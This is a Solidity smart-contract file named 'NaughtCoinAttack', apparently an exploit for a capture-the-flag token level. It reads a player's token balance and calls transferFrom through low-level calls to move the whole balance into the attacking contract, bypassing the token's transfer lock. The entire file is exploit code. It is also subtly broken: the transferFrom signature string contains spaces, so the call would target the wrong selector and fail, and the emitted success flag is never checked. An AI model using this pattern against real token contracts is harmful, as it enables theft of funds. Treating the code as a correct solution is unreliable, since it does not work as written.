// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract NaughtCoinAttack{
    address private player;
    address private instant;

    event log(bool);

    constructor(address _player,address _instant) {
        player = _player;
        instant = _instant;
    }

    function exp() public {
        bytes memory data;
        (, data)=instant.call(abi.encodeWithSignature("balanceOf(address)",player));
        uint256 balance = abi.decode(data, (uint256));
        (bool success, ) =  instant.call(abi.encodeWithSignature("transferFrom(address, address, uint256)", player, address(this), balance));
        emit log(success);
    }
}